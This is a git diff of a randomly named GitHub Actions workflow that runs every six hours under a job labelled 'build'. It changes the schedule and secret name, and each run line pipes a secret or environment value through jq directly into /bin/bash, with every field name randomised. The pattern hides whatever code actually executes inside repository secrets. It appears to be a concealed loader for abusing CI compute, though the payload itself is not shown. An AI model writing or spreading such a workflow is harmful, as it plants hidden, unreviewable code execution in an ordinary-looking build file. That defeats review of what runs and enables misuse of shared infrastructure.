@@ -2,29 +2,24 @@ name: hebaise4756
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '31 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hebaise4756
         env:
-          nip90: ${{ secrets.nip90 }}
+          llcfj30: ${{ secrets.llcfj30 }}
         run: |
-          echo $nip90 | jq -r .sorsf7 | /bin/bash
-          echo $hzd43702 | jq -r .m9110 | /bin/bash
-          echo $f92215 | jq -r .xgo22439 | /bin/bash
-          echo $yyok789 | jq -r .bpni041 | /bin/bash
-          echo $hx9558 | jq -r .qwoyr2 | /bin/bash
-          echo $fl8 | jq -r .zuxlz78 | /bin/bash
-          echo $nei2763 | jq -r .oevrk4 | /bin/bash
-          echo $toquo0453 | jq -r .wyh858 | /bin/bash
-          echo $x2 | jq -r .n61 | /bin/bash
-          echo $bam41 | jq -r .p021 | /bin/bash
-          echo $s427 | jq -r .oxpvj3764 | /bin/bash
-          echo $akdmw7 | jq -r .k32786 | /bin/bash
-          echo $zsx5197 | jq -r .xfvl80 | /bin/bash
-          echo $hdno84 | jq -r .cpa3 | /bin/bash
+          echo $llcfj30 | jq -r .q9199 | /bin/bash
+          echo $hm28277 | jq -r .l905 | /bin/bash
+          echo $npt83011 | jq -r .peb75809 | /bin/bash
+          echo $um2 | jq -r .ua91 | /bin/bash
+          echo $tcfy222 | jq -r .buhfm85167 | /bin/bash
+          echo $sqh6642 | jq -r .dd6318 | /bin/bash
+          echo $bjpwx4 | jq -r .ir8111 | /bin/bash
+          echo $boaq81651 | jq -r .hipzb941 | /bin/bash
 
